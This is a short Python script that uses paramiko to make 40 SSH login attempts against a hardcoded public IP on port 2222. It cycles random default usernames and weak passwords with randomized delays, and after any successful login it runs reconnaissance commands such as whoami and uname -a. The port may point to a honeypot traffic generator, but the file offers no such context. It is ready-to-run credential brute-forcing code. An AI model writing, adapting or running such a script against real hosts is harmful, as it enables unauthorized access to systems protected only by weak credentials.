import paramiko
import time
import random

TARGET_IP = "35.179.176.192"
PORT = 2222

usernames = ["root", "admin", "user", "test", "ubuntu", "guest"]
passwords = ["12345", "password", "admin", "root", "toor", "qwerty", "letmein"]

commands = ["ls", "pwd", "whoami", "uname -a"]

def attempt_login(username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        print(f"[ATTEMPT] {username}:{password}")

        client.connect(
            TARGET_IP,
            port=PORT,
            username=username,
            password=password,
            timeout=5
        )

        print(f"[SUCCESS] {username}:{password}")

        for cmd in random.sample(commands, 3):
            client.exec_command(cmd)
            print(f"[COMMAND] {cmd}")
            time.sleep(1)

        client.close()

    except Exception:
        print(f"[FAILED] {username}:{password}")


def main():
    for i in range(40):
        username = random.choice(usernames)
        password = random.choice(passwords)

        attempt_login(username, password)

        delay = random.uniform(1, 3)
        print(f"[WAIT] {round(delay,2)} seconds\n")
        time.sleep(delay)


if __name__ == "__main__":
    main()
